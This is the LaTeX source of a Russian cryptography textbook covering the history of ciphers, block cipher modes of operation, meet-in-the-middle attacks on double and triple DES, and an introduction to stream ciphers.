\input{_settings}
\selectlanguage{russian}

\title{Защита информации \\ Учебное пособие}
\author{Габидулин Эрнст Мухамедович \\ Кшевецкий Александр Сергеевич \\ Колыбельников Александр Иванович \\ Владимиров Сергей Михайлович}
\date{
 %   \textbf{\textsc{Черновой вариант. Может содержать ошибки.}} \\
%    \today
}
\maketitle
\setcounter{page}{3}

\newpage
%\thispagestyle{empty}
\setcounter{tocdepth}{2}
\tableofcontents
%\thispagestyle{empty}
\newpage

%\lhead[\leftmark]{}
%\rhead[]{\rightmark}

\input{foreword}

\chapter{Краткая история криптографии}

Вслед за возникновением письменности появилась задача обеспечения секретности передаваемых сообщений путём так называемой тайнописи. Поскольку государства возникали почти одновременно с письменностью, дипломатия и военное управление требовали секретности.

Данные о первых способах тайнописи весьма отрывочны. В древнеиндийских трактатах встречаются упоминания о способах преобразования текста, некоторые из которых можно отнести к криптографии. Предполагается, что тайнопись была известна в Древнем Египте и Вавилоне. До нашего времени дошли литературные свидетельства того, что секретное письмо использовалось в Древней Греции: в Древней Спарте использовалась скитала\index{скитала} (<<шифр Древней Спарты>>\index{шифр!Древней Спарты}, рис.~\ref{fig:Skytale}), одно из древнейших известных криптографических устройств. Скитала представляла собой длинный цилиндр, на который наматывалась полоска пергамента. Текст писали поперёк ленты вдоль цилиндра. Для расшифрования был необходим цилиндр аналогичного диаметра. Считается, что ещё Аристотель предложил метод криптоанализа скиталы: не зная точного диаметра оригинального цилиндра, он предложил наматывать пергамент на конус до тех пор, пока текст не начнёт читаться. Следовательно, Аристотеля можно называть одним из первых известных криптоаналитиков.

\begin{figure}[t]
	\centering
	\subcaptionbox{Скитала. Рисунок современного автора. Рисунок участника Wikimedia Commons Luringen, доступно по \href{https://creativecommons.org/licenses/by-sa/3.0/deed.ru}{лицензии CC BY-SA 3.0}\label{fig:Skytale}}{\includegraphics[width=0.60\textwidth]{pic/Skytale}}
	~~
	\subcaptionbox{Аристотель (384 -- 322~гг.~до~н.~э.). Римская копия оригинала Лисиппа}{\includegraphics[width=0.35\textwidth]{pic/Aristotle_Altemps_Inv8575}}
	\caption{Скитала\index{скитала}, <<шифр Древней Спарты>>\index{шифр!Древней Спарты}}
\end{figure}

В Ветхом Завете, в том числе в книге пророка Иеремии (VI~век до~н.~э.), использовалась техника скрытия отдельных кусков текста, получившая название <<атбаш>>\index{шифр!атбаш}.

\begin{itemize}
	\item \texttt{Иер. 25:26}: и всех царей севера, близких друг к другу и дальних, и все царства земные, которые на лице земли, а царь Сесаха выпьет после них.
	\item \texttt{Иер. 51:41}: Как взят Сесах, и завоевана слава всей земли! Как сделался Вавилон ужасом между народами!
\end{itemize}

В этих отрывках слово <<Сесах>> относится к государству, неупоминаемому в других источниках, но если в написании слова <<Сесах>> на иврите (\cjRL{/s/sK}) заменить первую букву алфавита на последнюю, вторую на предпоследнюю и так далее, то получится <<Бавель>> (\cjRL{bbl}) -- одно из названий Вавилона. Таким образом, с помощью техники <<атбаш>> авторы манускрипта скрывали отдельные названия, оставляя б\'{о}льшую часть текста без шифрования. Возможно, это делалось в том числе и для того, чтобы не иметь проблем с распространением текстов на территории, подконтрольной Вавилону. Шифр <<атбаш>>\index{шифр!атбаш} можно рассматривать как пример моноалфавитного афинного шифра (см. раздел~\ref{section-affine-cipher}).

Сразу несколько техник защищённой передачи сообщений связывают с именем Энея Тактика, полководца IV~века до~н.~э.
\begin{itemize}
	\item \emph{Диск Энея} представлял собой диск небольшого диаметра с отверстиями, которые соответствовали буквам алфавита. Отправитель протягивал нитку через отверстия, тем самым кодируя сообщение. Диск с ниткой отправлялся получателю. Особенностью диска Энея было то, что, в случае захвата гонца, последний мог быстро выдернуть нитки из диска, фактически уничтожив передаваемое сообщение.
	\item \emph{Линейка Энея} представляла собой линейку с отверстиями, соответствующими буквам греческого алфавита. Нитку также продевали через отверстия, тем самым шифруя сообщение. Однако после продевания на нитке завязывали узлы. После окончания нитку снимали с линейки и отправляли получателю. Чтобы восстановить сообщение, получатель должен был иметь линейку с таким же порядком отверстий, как та, на которой текст шифровался. Подобный метод можно назвать моноалфавитным шифром (см. раздел~\ref{section-substitution-cipher}), исходное сообщение -- открытым текстом, нитку с узлами -- шифртекстом, а саму линейку -- ключом шифрования.
	\item Ещё одна техника, \emph{книжный шифр Энея}, состояла в прокалывании небольших отверстий в книге или манускрипте рядом с буквами, соответствующими буквам исходного сообщения. Этот метод относится уже не к криптографии, а к стеганографии -- науке о скрытии факта передачи сообщения.
\end{itemize}

Ко II~веку до~н.~э. относят изобретение в Древней Греции квадрата Полибия (рис.~\ref{fig:polubios-square}). Метод позволял передавать информацию на большие расстояния с помощью факелов. Каждой букве алфавита ставилось в соответствие два числа от 1 до 5 (номера строки и столбца в квадрате Полибия). Эти числа обозначали количество факелов, которое было необходимо поднять на сигнальной башне. Квадрат Полибия относится к методам кодирования информации: переводу информации из одного представления (греческого алфавита) в другое (число факелов) для удобства хранения, обработки или передачи.

\begin{figure}[t]
	\centering
\begin{tabular}{ || c || c | c | c | c | c ||}
\hline
\hline
  & 1 & 2 & 3 & 4 & 5 \\
\hline
\hline
1 & A & B & $\Gamma$ & $\Delta$ & E \\
\hline
2 & Z & H & $\Theta$ & I & K \\
\hline
3 & $\Lambda$ & M & N & $\Xi$ & O  \\
\hline
4 & $\Pi$ & P & $\Sigma$ & T & $\Upsilon$ \\
\hline
5 & $\Phi$ & X & $\Psi$ & $\Omega$ & \\
\hline
\hline
\end{tabular}
  \caption{Квадрат Полибия для греческого алфавита}
  \label{fig:polubios-square}
\end{figure}

Известен метод шифрования, который использовался Гаем Юлием Цезарем (100--44~гг.~до~н.~э.). Он получил название <<шифр Цезаря>>\index{шифр!Цезаря} и состоял в замене каждой буквы текста на другую букву, следующую в алфавите через две позиции (см. раздел~\ref{section-caesar-cipher}). Данный метод относится к классу моноалфавитных шифров.

В VIII веке~н.~э. была опубликована <<Книга тайного языка>> Аль-Халиля аль-Фарахиди, в которой арабский филолог описал технику криптоанализа, сейчас известную как атака по открытому тексту. Он предположил, что первыми словами письма, которое было отправлено византийскому императору, была фраза <<Во имя Аллаха>>, что оказалось верным и позволило расшифровать оставшуюся часть письма. Абу аль-Кинди (801--873~гг.~н.~э.) в своём <<Трактате о дешифровке криптографических сообщений>> показал, что моноалфавитные шифры, в которых каждому символу кодируемого текста ставится в однозначное соответствие какой-то другой символ алфавита, легко поддаются частотному криптоанализу. В тексте трактата аль-Кинди привёл таблицу частот букв, которую можно использовать для дешифровки шифртекстов на арабском языке, использующих моноалфавитный шифр.

\begin{figure}[t]
	\centering
	\subcaptionbox{Статуя Леона Баттиста Альберти (\langit{Leone Battista Alberti}, 1404--1472) во дворе Уффици. Фото участника it.wiki Frieda, доступно по \href{https://creativecommons.org/licenses/by-sa/3.0/deed.ru}{лицензии CC-BY-SA 3.0}}{\includegraphics[width=0.50\textwidth]{pic/Leon_Battista_Alberti_1}}
	~
	\subcaptionbox{Фрагмент оформления гробницы Иоганна Тритемия (\langlat{Iohannes Trithemius}, 1462--1516)}{\includegraphics[width=0.45\textwidth]{pic/Trithemiusmoredetail}}
	\caption{Отцы западной криптографии}
\end{figure}

Итальянский архитектор Леон Баттиста Альберти, проанализировав использовавшиеся в Европе шифры, предложил для каждого текста использовать не один, а несколько моноалфавитных шифров. Однако Альберти не смог предложить законченной идеи полиалфавитного шифра, хотя его и называют отцом западной криптографии. В истории развития полиалфавитных шифров до XX века также наиболее известны немецкий аббат XVI века Иоганн Тритемий и английский учёный XIX века Чарльз Уитстон (\langen{Charles Wheatstone}, 1802--1875). Уитстон изобрёл простой и стойкий способ полиалфавитной замены, называемый шифром Плейфера\index{шифр!Плейфера} в честь лорда Плейфера, способствовавшего внедрению шифра. Шифр Плейфера использовался вплоть до Первой мировой войны.

\begin{figure}[t]
	\centering
	\subcaptionbox{<<Энигма>>\label{fig:enigma}}{\includegraphics[width=0.35\textwidth]{pic/EnigmaMachine}}
	~~
	\subcaptionbox{<<Лоренц>> (без кожуха)\label{fig:lorenz}}{\includegraphics[width=0.60\textwidth]{pic/Lorenz-SZ42-2}}
	\caption{Криптографические машины Второй мировой войны}
\end{figure}

Роторные машины XX века позволяли создавать и реализовывать устойчивые к <<наивному>> взлому полиалфавитные шифры. Примером такой машины является немецкая <<Энигма>>\index{Энигма}, разработанная в конце Первой мировой войны (рис.~\ref{fig:enigma}). Период активного применения <<Энигмы>> пришёлся на Вторую мировую войну. Хотя роторные машины использовались в промышленных масштабах, криптография, на которой они были основаны, представляла собой всё ещё искусство, а не науку. Отсутствовал научный базис надёжности криптографических инструментов. Возможно, это было одной из причин успеха криптоанализа <<Энигмы>>, который сначала был достигнут в Польше в <<Бюро шифров>>, а потом и в <<Блетчли-парке>> в Великобритании. Польша впервые организовала курсы криптографии не для филологов и специалистов по немецкому языку, а для математиков, хотя и знающих язык весьма вероятного противника. Трое из выпускников курса — Мариан Реевский, Генрих Зыгальский и Ежи Рожицкий — поступили на службу в «Бюро шифров» и получили первые результаты успешного криптоанализа. Используя математику, электромеханические приспособления и данные французского агента Asche (Ганс-Тило Шмидт), они могли дешифровывать значительную часть сообщений вплоть до лета 1939 года, когда вторжение Германии в Польшу стало очевидным. Дальнейшая работа по криптоанализу <<Энигмы>> в центре британской разведки <<Station~X>>\index{Station X} (<<Блетчли-парк>>\index{Блетчли-парк}) связана с именами таких известных математиков, как Гордон Уэлчман и Алан Тьюринг. Кроме <<Энигмы>> в центре проводили работу над дешифровкой и других шифров, в том числе немецкой шифровальной машины <<Лоренц>> (рис.~\ref{fig:lorenz}). Для целей её криптоанализа был создан компьютер Colossus, имевший 1500 электронных ламп, а его вторая модификация -- Colossus Mark II -- считается первым в мире программируемым компьютером в истории ЭВМ.

Середина XX века считается основной вехой в истории науки о защищённой передаче информации и криптографии. Эта веха связана с публикацией двух статей Клода Шеннона: <<Математическая теория связи>> (\langen{"A Mathematical Theory of Communication"}, 1948, \cite{Shannon:1948:MTCa, Shannon:1948:MTCb}) и <<Теория связи в секретных системах>> (\langen{"Communication Theory of Secrecy Systems"}, 1949, \cite{Shannon:1949:CTS}). В данных работах Шеннон впервые определил фундаментальные понятия в теории информации, а также показал возможность применения этих понятий для защиты информации, тем самым заложив математическую основу современной криптографии.

Кроме того, появление электронно-вычислительных машин кардинально изменило ситуацию в криптографии. С одной стороны, вычислительные способности ЭВМ открыли совершенно новые возможности реализации шифров, недоступных ранее из-за их высокой сложности. С другой стороны, аналогичные возможности стали доступны и криптоаналитикам. Появилась необходимость не только в создании шифров, но и в обосновании того, что новые вычислительные возможности не смогут быть использованы для взлома новых шифров.

В 1976 году появился шифр DES (\langen{Data Encryption Standard})\index{шифр!DES}, который был принят как стандарт США. DES широко использовался для шифрования пакетов данных при передаче в компьютерных сетях и системах хранения данных. С 90-х годов параллельно с традиционными шифрами, основой которых была булева алгебра, активно развиваются шифры, основанные на операциях в конечном поле. Широкое распространение персональных компьютеров и быстрый рост производительности ЭВМ и объёма передаваемых данных в компьютерных сетях привели к замене в 2002 году стандарта DES на более стойкий и быстрый в программной реализации стандарт -- шифр AES (\langen{Advanced Encryption Standard})\index{шифр!AES}. Окончательно DES был выведен из эксплуатации как стандарт в 2005 году.

В беспроводных голосовых сетях передачи данных используются шифры с малой задержкой шифрования и расшифрования на основе посимвольных преобразований -- так называемые \emph{потоковые шифры}\index{шифр!потоковый}.

Параллельно с разработкой быстрых шифров в 1976~г. появился новый класс криптосистем, так называемые \emph{криптосистемы с открытым ключом}\index{криптосистема!с открытым ключом}. Хотя эти новые криптосистемы намного медленнее и технически сложнее симметричных, они открыли принципиально новые возможности: создание общего ключа с использованием открытого канала и \emph{электронной подписи}, которые составили основу современной защищённой связи в Интернете.



\input{definitions}

\chapter{Классические шифры}

В главе приведены наиболее известные \emph{классические} шифры, которыми можно было пользоваться до появления роторных машин. К ним относятся такие шифры, как шифр Цезаря\index{шифр!Цезаря}, шифр Плейфера\index{шифр!Плейфера}, шифр Хилла\index{шифр!Хилла} и шифр Виженера\index{шифр!Виженера}. Они наглядно демонстрируют различные классы шифров.

\input{monoalphabetic_ciphers}

\input{bigrammnye_substitution_ciphers}

\input{hills_cipher}

% \subsection{Омофонные замены}
%
% Омофонными заменами называют криптопримитивы, в основе которых лежит замена групп символов открытого текста $M$ на группу символов $C$ с использованием ключа $K$. Такой метод шифрования вносит неоднозначность между $M$ и $C$, это позволяет защититься от методов частотного криптоанализа.
%  \subsection{шифрокоды}
%  Шифрокоды -- это класс шифров сочетающих в себе свойства кодов и помехозащищённости со свойствами шифра и обеспечения конфиденциальности.

\input{vigeneres_cipher}

\input{polyalphabetic_cipher_cryptanalysis}

\input{perfect_secure_systems}

\chapter{Блочные шифры}\label{chapter-block-ciphers}\index{шифр!блочный|(}

\input{block_ciphers}

\input{lucifer}

\input{Feistel_cipher}

\input{DES}

\input{GOST_28147-89}

\input{AES}

\input{GOST_R_34.12-2015}

\section{Режимы работы блочных шифров}\label{section-block-chaining}
\selectlanguage{russian}

Перед шифрованием открытый текст $M$ разбивают на части $M_1, M_2, \dots, M_n$, называемые \emph{блоками шифрования}\index{блок!шифрования}. Размер блока зависит от используемого блочного шифра, и, как упоминалось ранее, для шифра <<Магма>>\index{шифр!Магма} он составляет 64 бита, для AES\index{шифр!AES} и шифра <<Кузнечик>>\index{шифр!Кузнечик} -- 128 бит.
    \[ M = M_1 || M_2 || \dots || M_i. \]

Размер открытого текста может быть не кратен размеру блока шифрования. В этом случае для последнего блока применяют процедуру дополнения (удлинения) до стандартного размера. Процедура должна быть обратимой: после расшифрования последнего блока пакета лишние байты необходимо обнаружить и удалить. Некоторые способы дополнения:
\begin{itemize}
  \item добавить один байт со значением $128$, а остальные байты принять за нулевые;
  \item определить, сколько байтов надо добавить к последнему блоку, например $b$, и добавить $b$ байтов со значением $b$ в каждом.
\end{itemize}

После шифрования всех блоков открытого текста (блоков шифрования) получается набор блоков шифртекста $C_1, C_2, C_3, \dots, C_n$. Обычно размер этих блоков равен размеру блока шифрования (точно не может быть меньше блока шифрования). Процедура, по которой этот из этого набора блоков получается итоговый шифртекст, называется режимом работы блочного шифра. Некоторые режимы работы могут оперировать не только блоками шифртекста, но и исходными блоками шифрования, номерами блоков и специальными векторами инициализации.

Существует несколько режимов работы блочных шифров: режим электронной кодовой книги, режим шифрования зацепленных блоков, режим обратной связи, режим шифрованной обратной связи, режим счётчика. Рассмотрим особенности каждого из этих режимов.

\subsection{Электронная кодовая книга}

В режиме электронной кодовой книги (\langen{Electronic Code Book, ECB}) открытый текст в пакете разделён на блоки
    \[ \left[ M_1, M_2, \dots, M_{n-1}, M_n \right]. \]

В процессе шифрования каждому блоку $M_j$ ставится в соответствие шифртекст $C_j$, определяемый с помощью ключа $K$:
    \[ C_j = E_K(M_j), ~ j = 1, 2, \dots, n. \]

Если в открытом тексте есть одинаковые блоки, то в шифрованном тексте им также соответствуют одинаковые блоки. Это даёт дополнительную информацию для криптоаналитика, что является недостатком этого режима. Другой недостаток состоит в том, что криптоаналитик может подслушивать, перехватывать, переставлять, воспроизводить ранее записанные блоки, нарушая конфиденциальность\index{конфиденциальность} и целостность\index{целостность} информации. Поэтому при работе в режиме электронной кодовой книги нужно вводить аутентификацию сообщений.

Шифрование в режиме электронной кодовой книги не использует сцепление блоков и синхропосылку\index{синхропосылка} (вектор инициализации)\index{вектор инициализации}. Поэтому для данного режима применима атака на различение сообщений, так как два одинаковых блока или два одинаковых открытых текста шифруются идентично.

На рис.~\ref{fig:ecb-demo} приведён пример шифрования графического файла морской звезды в формате BMP, 24 бита цветности на пиксель (рис.~\ref{fig:starfish}), блочным шифром AES с длиной ключа 128 бит в режиме электронной кодовой книги (рис.~\ref{fig:starfish-aes-128-ecb}). В начале зашифрованного файла был восстановлен стандартный заголовок формата BMP. Как видно, в зашифрованном файле изображение всё равно различимо.
\begin{figure}[!ht]
    \centering
    \subcaptionbox{Исходный рисунок\label{fig:starfish}}{ \includegraphics[width=0.45\textwidth]{pic/starfish}}
    ~~~
    \subcaptionbox{Рисунок, зашифрованный AES-128\label{fig:starfish-aes-128-ecb}}{ \includegraphics[width=0.45\textwidth]{pic/starfish-aes-128-ecb}}
    \caption{Шифрование в режиме электронной кодовой книги\label{fig:ecb-demo}}
\end{figure}
BMP файл в данном случае содержит в самом начале стандартный заголовок (ширина, высота, количество цветов), и далее идёт массив 24-битовых значений цвета пикселей, взятых построчно сверху вниз. В массиве много последовательностей нулевых байтов, так как пиксели белого фона кодируются 3 нулевыми байтами. В AES размер блока равен 16 байтам, и, значит, каждые $\frac{16}{3}$ подряд идущих пикселей белого фона шифруются одинаково, позволяя различить изображение в зашифрованном файле.

%На рис.~\ref{fig:ecb-demo} приведён пример шифрования графического файла логотипа Википедии в формате BMP, 24 бита цветности на пиксель (рис.~\ref{fig:wikilogo}), блочным шифром AES с длиной ключа 128 бит в режиме электронной кодовой книги (рис.~\ref{fig:wikilogo-aes-128-ecb}). В начале зашифрованного файла был восстановлен стандартный заголовок BMP формата. Как видно, на зашифрованном рисунке возможно даже прочитать надпись.
%\begin{figure}[!ht]
%    \centering
%    \subfloat[Исходный рисунок]{\label{fig:wikilogo}\includegraphics[width=0.45\textwidth]{pic/wikilogo}}
%    ~~~
%    \subfloat[Рисунок, зашифрованный AES-128]{\label{fig:wikilogo-aes-128-ecb}\includegraphics[width=0.45\textwidth]{pic/wikilogo-aes-128-ecb}}
%    \caption{Шифрование в режиме электронной кодовой книги.}
%    \label{fig:ecb-demo}
%\end{figure}

%Возможно воссоздание структуры информации -- например, пингвин на рис.~\ref{fig:tux-ecbmode}. Картинка с пингвином записана в формате BMP и зашифрована DES в режиме электронной кодовой книги.
%\begin{figure}[!ht]
%    \centering
%    \includegraphics[width=0.3\textwidth]{pic/tux-ecb}
%    \caption{Картинка с пингвином, зашифрованная в режиме электронной кодовой книги.}
%    \label{fig:tux-ecbmode}
%\end{figure}


\subsection{Сцепление блоков шифртекста}

В режиме сцепления блоков шифртекста (\langen{Cipher Block Chaining, CBC}) перед шифрованием текущего блока открытого текста предварительно производится его суммирование по модулю $2$ с предыдущим блоком зашифрованного текста, что и осуществляет <<сцепление>> блоков. Процедура шифрования имеет вид:
\[ \begin{array}{l}
    C_j = E_K(M_j \oplus C_{j-1}), ~ j = 1, 2, \dots, n,
\end{array} \]
где $C_0 = \textrm{IV}$ (сокр. от \langen{Initialization Vector}) -- блок, называемый вектором инициализации. Другое название -- синхропосылка.

Благодаря сцеплению, \emph{одинаковым} блокам открытого текста соответствуют \emph{различные} шифрованные блоки. Это затрудняет криптоаналитику статистический анализ потока шифрованных блоков.

На приёмной стороне расшифрование осуществляется по правилу:
\[ \begin{array}{l}
    D_K(C_j) = M_j \oplus C_{j-1}, ~ j=1, 2, \dots, n,\\
    M_{j} = D_K(C_j) \oplus C_{j-1}.
\end{array} \]

Блок $C_0 = \textrm{IV}$ должен быть известен легальному получателю шифрованных сообщений. Обычно криптограф выбирает его случайно и вставляет на первое место в поток шифрованных блоков. Сначала передают блок $C_0$, а затем шифрованные блоки $C_1, C_2, \ldots, C_n$.

В разных пакетах блоки $C_0$ должны выбираться независимо. Если их выбрать одинаковыми, то возникают проблемы, аналогичные проблемам в режиме ECB. Например, часто первые нешифрованные блоки $M_1$ в разных пакетах бывают одинаковыми. Тогда одинаковыми будут и первые шифрованные блоки.

Однако случайный выбор векторов инициализации также имеет свои недостатки. Для выбора такого вектора необходим хороший генератор случайных чисел. Кроме того, каждый пакет удлиняется на один блок.

Для каждого сеанса передачи пакета нужны такие процедуры выбора $C_0$, которые известны криптографу и легальному пользователю. Одним из решений является использование так называемых \emph{одноразовых меток}. Каждому сеансу присваивается уникальное число. Его уникальность состоит в том, что оно используется только один раз и никогда не должно повторяться в других пакетах. В англоязычной научной литературе оно обозначается как \emph{Nonce}, то есть сокращение от <<Number used once>>\index{одноразовая метка}.

Обычно одноразовая метка состоит из номера сеанса и дополнительных данных, обеспечивающих уникальность. Например, при двустороннем обмене шифрованными сообщениями одноразовая метка может состоять из номера сеанса и индикатора направления передачи. Размер одноразовой метки должен быть равен размеру шифруемого блока. После определения одноразовой метки $\textrm{Nonce}$ вектор инициализации вычисляется в виде:
    \[ C_0 = \textrm{IV} = E_K(\textrm{Nonce}). \]

Этот вектор используется в данном сеансе для шифрования открытого текста в режиме CBC. Заметим, что блок $C_0$ передавать в сеансе необязательно, если приёмная сторона знает заранее дополнительные данные для одноразовой метки. Вместо этого достаточно вначале передать только номер сеанса в открытом виде. Принимающая сторона добавляет к нему дополнительные данные и вычисляет блок $C_0$, необходимый для расшифрования в режиме CBC. Это позволяет сократить издержки, связанные с удлинением пакета. Например, для шифра AES длина блока $C_0$ равна $16$ байтов. Если число сеансов ограничить величиной $2^{32}$ (вполне приемлемой для большинства приложений), то для передачи номера пакета понадобится только $4$ байта.


\subsection{Обратная связь по выходу}

В предыдущих режимах входными блоками для устройств шифрования были непосредственно блоки открытого текста.
В режиме обратной связи по выходу (OFB от Output FeedBack) блоки открытого текста непосредственно на вход устройства шифрования не поступают. Вместо этого устройство шифрования генерирует псевдослучайный поток байтов, который суммируется по модулю $2$ с открытым текстом для получения шифрованного текста. Шифрование осуществляют по правилу:
\[ \begin{array}{l}
    K_0 = \textrm{IV}, \\
    K_j = E_K(K_{j-1}), ~ j = 1, 2, \dots, n, \\
    C_j = K_j \oplus M_j.
\end{array} \]

Здесь текущий ключ $K_j$ есть результат шифрования предыдущего ключа $K_{j-1}$. Начальное значение $K_0$ известно криптографу и легальному пользователю. На приёмной стороне расшифрование выполняют по правилу:
\[ \begin{array}{l}
    K_0 = \textrm{IV}, \\
    K_j = E_K(K_{j-1}), ~ j = 1, 2, \dots, n, \\
    M_j = K_j \oplus C_j.
\end{array} \]

Как и в режиме CBC, вектор инициализации $\textrm{IV}$ может быть выбран случайно и передан вместе с шифрованным текстом, либо вычислен на основе одноразовых меток. Здесь особенно важна уникальность вектора инициализации.

Достоинство этого режима состоит в полном совпадении операций шифрования и расшифрования. Кроме того, в этом режиме не надо проводить операцию дополнения открытого текста.


\subsection{Обратная связь по шифрованному тексту}

В режиме обратной связи по шифрованному тексту (CFB от Cipher FeedBack) ключ $K_j$ получается с помощью процедуры шифрования предыдущего шифрованного блока $C_{j-1}$. Может быть использован не весь блок $C_{j-1}$, а только его часть. Как и в предыдущем случае, начальное значение ключа $K_0$ известно криптографу и легальному пользователю:
\[ \begin{array}{l}
    K_0 = \textrm{IV}, \\
    K_j = E_K(C_{j-1}), ~ j = 1, 2, \dots, n,\\
    C_j = K_j \oplus M_j.
\end{array} \]

У этого режима нет особых преимуществ по сравнению с другими режимами.


\subsection{Счётчик}

В режиме счётчика (CTR от Counter) правило шифрования имеет вид, похожий на режим обратной связи по выходу (OFB), но позволяющий вести независимое (параллельное) шифрование и расшифрование блоков:
\[ \begin{array}{l}
    K_j = E_K(\textrm{Nonce} ~\|~ j - 1), ~ j = 1, 2, \dots, n, \\
    C_j = M_j \oplus K_j,
\end{array} \]
где $\textrm{Nonce} ~\|~ j - 1$ -- конкатенация битовой строки одноразовой метки $\textrm{Nonce}$ и номера блока, уменьшенного на единицу.
%Для стандарта AES значение $\textrm{Nonce}$ занимает 16 бит, номер блока -- 48 бит. С одним ключом выполняется шифрование $2^{48}$ блоков.

Правило расшифрования идентичное:
\[ \begin{array}{l}
    M_j = C_j \oplus K_j. \\
\end{array} \]


\section{Некоторые свойства блочных шифров}

\input{feistel_network_reversibility}

\input{Feistel_cipher_without_s_blocks}

\input{Avalanche_effect}

\subsection{Двойное и тройное шифрования}\index{шифрование!двойное}\index{шифрование!тройное}
\selectlanguage{russian}

В конце XX-го века, когда ненадёжность существующего стандарта DES\index{шифр!DES} уже была очевидна, а нового стандарта ещё не было, стали распространены техники двойного и тройного шифрования, когда к одному блоку текста последовательно применяется несколько преобразований на разных ключах.

Например, двойное шифрование\index{шифрование!двойное} 2DES\index{шифр!2DES} использует два разных ключа $K_1$ и $K_2$ для шифрования одного блока текста дважды:
\[ E_{K1, K2} \left( M \right) \equiv E_{K1} \left( E_{K2} \left( M \right) \right). \]

Так как функция шифрования\index{функция!шифрования} DES не образует группу\index{группа} (\cite{Kaliski:Rivest:Sherman:1988, Campbell:Wiener:1993}), то данное преобразование неэквивалентно однократному шифрованию на каком-нибудь третьем ключе. То есть для произвольных $K_1$ и $K_2$ нельзя подобрать такой $K_3$, что
\[E_{K1} \left( E_{K2} \left( M \right) \right) \equiv E_{K3} \left( M \right).\]

Тем самым размер ключевого пространства (количество различных ключей шифрования, если считать за ключ пару $K_1$ и $K_2$) увеличивается с $2^{56}$ до $2^{112}$ (без учёта проверочных бит). Однако из-за атаки <<встреча посередине>>\index{атака!встреча посередине} (\langen{meet in the middle}) фактическая криптостойкость увеличилась не более чем до $2^{57}$.

Тройной DES (\langen{triple DES, 3DES})\index{шифрование!тройное}\index{шифр!3DES} использует тройное преобразование. Причём в качестве второй функции используется функция \emph{расшифрования}:
\[ E_{K1, K2, K3} \left( M \right) \equiv E_{K1} \left( D_{K2} \left( E_{K3} \left( M \right) \right) \right). \]

\begin{itemize}
	\item Вариант $K_1 \neq K_2 \neq K_3$ является наиболее защищённым, ключевое пространство увеличивается до $2^{168}$.
	\item Вариант $K_1 \neq K_2$, $K_1 = K_3$ увеличивает ключевое пространство до $2^{112}$, но защищён от атаки <<встреча посередине>>\index{атака!встреча посередине}, в отличие от 2DES\index{шифр!2DES}.
	\item Вариант $K_1 = K_2 = K_3$ эквивалентен однократному преобразованию DES\index{шифр!DES}. Его можно использовать для обеспечения совместимости.
\end{itemize}

Оценим сложность атак на 2DES\index{шифр!2DES} и 3DES\index{шифр!3DES}.

\subsubsection{Атака на двойное шифрование}

%Для упрощения записи введём обозначение последовательного шифрования $E_{K_1}( E_{K_2}( \dots E_{K_n}(M) \dots)) \equiv E{K_1} \circ E_{K_2} (M)$ и назовём его суперпозицией функций $E_{K_i}$.

Атака основана на предположении, что у криптоаналитика есть возможность получить либо шифртекст для любого открытого текста\index{атака!с известным шифртекстом} (\langen{Chosen Plaintext Attack, CPA}), либо открытый текст по шифртексту\index{атака!с известным открытым текстом} (\langen{Chosen Ciphertext Attack, CCA}), но неизвестен ключ шифрования, который и нужно найти.

Шифрование в 2DES\index{шифр!2DES}:
    \[ C = E_{K_1}( E_{K_2}(M)). \]
Запишем $D_{K_1}(C) = E_{K_2}(M)$. Пусть время одного шифрования -- $T_E$, время одного сравнения блоков $T_{=} \approx 2^{-10} T_E$.

Атака для нахождения ключей без использования памяти занимает время
    \[ T = 2^{56 + 56} (T_E + T_{=}) \approx 2^{112} T_E. \]

Можно заранее вычислить значения $E_{K_2}(M)$ для всех ключей и построить таблицу: индекс -- $E_{K_2}(M)$, значения поля -- набор ключей $K_2$, которые соответствуют этому значению. Атака для нахождения ключей требует времени
    \[ T = 2 \cdot 2^{56} T_E + 2^{56} T_{=} \approx 2^{57} T_E \]
и памяти $M = 56 \cdot 2^{56} \approx 2^{62}$ бит ($\approx 504$ Пбайт), учитывая прямой доступ по значению к возможным ключам. При нахождении соответствия берётся другая пара (открытый текст, шифртекст) и проверяется равенство для определения, являются ли ключи правильными или нет.

По отношению к CCA и CPA криптостойкость 2DES\index{шифр!2DES} эквивалентна обычному DES\index{шифр!DES} с использованием 26 ГиБ памяти.

\subsubsection{Атака на тройное шифрование}

Атака для нахождения ключей (CCA\index{атака!с известным шифртекстом}, CPA\index{атака!с известным открытым текстом}) на наиболее стойкий вариант 3DES\index{шифр!3DES} (все три ключа $K_1$, $K_2$ и $K_3$ выбираются независимо) требует времени $T \approx 2^{168} T_E$ без использования дополнительной памяти.

Для построения таблицы запишем
    \[ D_{K_2}( D_{K_1}( C)) = E_{K_3} (M). \]
Таблица строится аналогично 2DES\index{шифр!2DES} для $E_{K_3}(M)$. С использованием памяти атака занимает время $T = 2^{112} T_E$ и память $M = 26$ GiB.


\index{шифр!блочный|)}

\input{generators}

\chapter{Потоковые шифры}\label{chapter-stream-ciphers}
\selectlanguage{russian}

Потоковые шифры осуществляют посимвольное шифрование открытого текста. Под символом алфавита открытого текста могут пониматься как отдельные биты (побитовое шифрование), так и байты (побайтовое шифрование). Поэтому можно говорить о в какой-то мере условном разделении блочных и потоковых шифров: например, 64-битная буква - один блок. Общий вид большинства потоковых шифров приведён на рис.~\ref{fig:stream-cipher}.

\begin{figure}[hb]
	\centering
	\includegraphics[width=0.66\textwidth]{pic/stream-cipher}
  \caption{Общая структура шифрования с использованием потоковых шифров}
  \label{fig:stream-cipher}
\end{figure}

\begin{itemize}
	\item Перед началом процедуры шифрования отправитель и получатель должны обладать общим секретным ключом.
	\item Секретный ключ используется для генерации инициализирующей последовательности (\langen{seed}) генератора псевдослучайной последовательности.
	\item Генераторы отправителя и получателя используются для получения одинаковой псевдослучайной последовательности символов, называемой \emph{гаммой}\index{гамма}. Последовательности одинаковые, если для их получения использовались одинаковые ГПСЧ, инициализированные одной и той же инициализирующей последовательностью, при условии, что генераторы детерминированные.
	\item Символы открытого текста на стороне отправителя складываются с символами гаммы, используя простейшие обратимые преобразования. Например, побитовое сложение по модулю 2 (операция <<исключающее или>>, \langen{XOR}). Полученный шифртекст передаётся по каналу связи.
	\item На стороне легального получателя с символами шифртекста и гаммы выполняется обратная операция (для XOR это будет просто повторный XOR) для получения открытого текста.
\end{itemize}

Очевидно, что криптостойкость потоковых шифров непосредственно основана на стойкости используемых ГПСЧ. Большой размер инициализирующей последовательности, длинный период, большая линейная сложность -- необходимые атрибуты используемых генераторов. Одним из преимуществ потоковых шифров по сравнению с блочными является более высокая скорость работы.

